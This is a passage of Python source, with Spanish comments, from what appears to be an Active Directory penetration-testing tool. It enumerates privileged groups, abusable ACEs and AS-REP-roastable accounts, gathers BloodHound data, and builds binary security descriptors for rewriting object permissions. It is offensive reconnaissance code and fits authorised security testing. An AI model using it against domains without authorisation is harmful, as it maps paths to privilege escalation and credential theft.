                "name":           _attr(e, "cn", ""),
                "precedence":     int(_attr(e, "msDS-PasswordSettingsPrecedence", "0")),
                "min_length":     int(_attr(e, "msDS-MinimumPasswordLength", "0")),
                "lockout_thresh": int(_attr(e, "msDS-LockoutThreshold", "0")),
                "applies_to":     _attr_all(e, "msDS-AppliesTo"),
                "complexity":     _attr(e, "msDS-PasswordComplexityEnabled", "FALSE") == "TRUE",
            })
        return results

    def get_admin_groups(self):
        """
        Retorna miembros de grupos privilegiados (DA, EA, BA, etc.).
        Retorna dict: {group_name: [member_dn, ...]}
        """
        domain_sid_prefix = self.get_domain_info().get("sid", "").rsplit("-", 1)[0]
        results = {}
        for rid, group_name in PRIVILEGED_RIDS.items():
            group_sid = "{}-{}".format(domain_sid_prefix, rid)
            entries = self._search(
                "(objectSid={})".format(group_sid),
                ["sAMAccountName", "member"],
            )
            if not entries:
                # Intentar por nombre
                entries = self._search(
                    "(sAMAccountName={})".format(group_name.replace(" ", "*")),
                    ["sAMAccountName", "member"],
                )
            if entries:
                members = _attr_all(entries[0], "member")
                if members:
                    results[group_name] = members
                    session_db.save_finding(
                        self.target.ip, "LDAP", "privileged_group_members",
                        "{}: {} miembro(s)".format(group_name, len(members)),
                    )
        return results

    def get_interesting_aces(self, target_dn=None):
        """
        Busca ACEs interesantes (GenericAll, WriteDACL, GenericWrite, etc.)
        en objetos críticos del dominio.

        target_dn: DN específico a analizar; si es None, analiza el objeto raíz
                   del dominio y los grupos privilegiados.

        Retorna lista de dicts:
          {object_dn, trustee_sid, trustee_dn, access_mask, ace_type, rights}
        """
        targets = []
        if target_dn:
            targets.append(target_dn)
        else:
            targets.append(self._base_dn)
            # Añadir grupos privilegiados
            for rid in (512, 519, 544):
                entries = self._search(
                    "(objectClass=group)",
                    ["distinguishedName", "objectSid"],
                )
                for e in entries:
                    sid = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
                    if sid.endswith("-{}".format(rid)):
                        targets.append(_attr(e, "distinguishedName", ""))

        results = []
        for dn in targets:
            if not dn:
                continue
            entries = self._search(
                "(distinguishedName={})".format(dn),
                ["nTSecurityDescriptor"],
                base_dn=dn,
            )
            for e in entries:
                sd_bytes = _attr_bytes(e, "nTSecurityDescriptor")
                if not sd_bytes:
                    continue
                aces = self._parse_dacl_aces(sd_bytes, dn)
                results.extend(aces)

        return results

    def get_asreproastable_users(self):
        """
        Devuelve usuarios con DONT_REQUIRE_PREAUTH (UAC 0x400000).
        Usado por ldap/attack/asreproast-targets.
        """
        entries = self._search(
            "(&(objectClass=user)(!(objectClass=computer))"
            "(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            ["sAMAccountName", "distinguishedName", "objectSid",
             "pwdLastSet", "lastLogon"],
        )
        results = []
        for e in entries:
            user = _attr(e, "sAMAccountName", "")
            sid  = _sid_to_str(_attr_bytes(e, "objectSid") or b"")
            results.append({
                "user":         user,
                "dn":           _attr(e, "distinguishedName", ""),
                "sid":          sid,
                "pwd_last_set": _filetime_str(_attr(e, "pwdLastSet", "0")),
                "last_logon":   _filetime_str(_attr(e, "lastLogon", "0")),
            })
            session_db.save_finding(
                self.target.ip, "LDAP", "asreproastable",
                user,
            )
        return results

    def get_bloodhound_data(self):
        """
        Recopila los datos necesarios para BloodHound en formato estructurado.
        Retorna dict con claves: users, groups, computers, domain_info.
        No serializa a JSON — eso lo hace el script bloodhound-export.
        """
        return {
            "domain_info": self.get_domain_info(),
            "users":       self.get_all_users(),
            "groups":      self.get_all_groups(),
            "computers":   self.get_all_computers(),
        }

    # ==================================================================
    # Helpers privados — construcción de Security Descriptors binarios
    # ==================================================================

    @staticmethod
    def _sid_str_to_bytes(sid_str):
        """Convierte SID string (S-1-5-21-...) a bytes binarios."""
        parts  = sid_str.split("-")
        # parts[0]='S', parts[1]=revision, parts[2]=authority, parts[3..]=sub-auths
        rev    = int(parts[1])
        auth   = int(parts[2])
        subs   = [int(x) for x in parts[3:]]
        buf    = bytearray()
        buf.append(rev)
        buf.append(len(subs))
        buf += auth.to_bytes(6, "big")
        for s in subs:
            buf += struct.pack("<I", s)
        return bytes(buf)

    @staticmethod
    def _build_allowed_ace(mask, sid_bytes):
        """Construye una ACCESS_ALLOWED_ACE binaria."""
        # ACE header: type(1) + flags(1) + size(2) + mask(4) + SID
        sid_len  = len(sid_bytes)
        ace_size = 4 + 4 + sid_len   # header(4) + mask(4) + SID
        buf  = b"\x00"               # ACE_TYPE: ACCESS_ALLOWED_ACE
        buf += b"\x00"               # ACE_FLAGS
        buf += struct.pack("<H", ace_size)
        buf += struct.pack("<I", mask)
        buf += sid_bytes
        return buf

    @staticmethod
    def _build_dacl(aces):
        """Construye una DACL (lista de ACEs)."""
        # DACL header: revision(2) + Sbz1(2) + size(2) + ace_count(2) + Sbz2(2)
        ace_data  = b"".join(aces)
        dacl_size = 8 + len(ace_data)
        buf  = b"\x04\x00"                       # revision 4
        buf += b"\x00\x00"                       # Sbz1
        buf += struct.pack("<H", dacl_size)
        buf += struct.pack("<H", len(aces))
        buf += b"\x00\x00"                       # Sbz2
        buf += ace_data
        return buf

    @staticmethod
    def _build_sd(dacl):
        """Construye un Security Descriptor self-relative mínimo con solo DACL."""
        # SD header: revision(1) + Sbz1(1) + control(2) + owner_off(4) +
        #            group_off(4) + sacl_off(4) + dacl_off(4)
        sd_hdr_size = 20
        dacl_offset = sd_hdr_size
        # Control: SE_DACL_PRESENT (0x04) | SE_SELF_RELATIVE (0x8000)
        control = 0x8004
        buf  = b"\x01"                          # revision
        buf += b"\x00"                          # Sbz1
        buf += struct.pack("<H", control)
        buf += struct.pack("<I", 0)             # owner offset (0 = no owner)
        buf += struct.pack("<I", 0)             # group offset
        buf += struct.pack("<I", 0)             # sacl offset (no SACL)
        buf += struct.pack("<I", dacl_offset)  # dacl offset
        buf += dacl
        return buf

    def _parse_dacl_aces(self, sd_bytes, object_dn):
        """
        Parsea nTSecurityDescriptor y devuelve ACEs con mask interesante.
        """
        results = []
        try:
            sd = SR_SECURITY_DESCRIPTOR(data=sd_bytes)
            if not sd["Dacl"]:
                return results
            for ace in sd["Dacl"]["Data"]:
                ace_type = ace["AceType"]
                if ace_type not in (0x00, 0x05):   # ALLOWED o ALLOWED_OBJECT
                    continue
                mask = int(ace["Ace"]["Mask"]["Value"])
                if not (mask & INTERESTING_MASK):
                    continue
                sid_obj = ace["Ace"]["Sid"]
                sid_str = sid_obj.formatCanonical()

                rights = []
                if mask & ADS_RIGHT_GENERIC_ALL:   rights.append("GenericAll")
                if mask & ADS_RIGHT_GENERIC_WRITE:  rights.append("GenericWrite")
                if mask & ADS_RIGHT_WRITE_DACL:     rights.append("WriteDACL")
                if mask & ADS_RIGHT_WRITE_OWNER:    rights.append("WriteOwner")
                if mask & ADS_RIGHT_DS_WRITE_PROP:  rights.append("WriteProperty")
                if mask & ADS_RIGHT_DS_CONTROL_ACCESS: rights.append("ControlAccess")

                results.append({
                    "object_dn":   object_dn,
                    "trustee_sid": sid_str,
                    "access_mask": mask,
                    "ace_type":    ace_type,
                    "rights":      rights,
                })
                session_db.save_finding(
                    self.target.ip, "LDAP", "interesting_ace",
                    "{} has {} on {}".format(sid_str, "|".join(rights), object_dn),
                )
        except Exception:
            pass
        return results
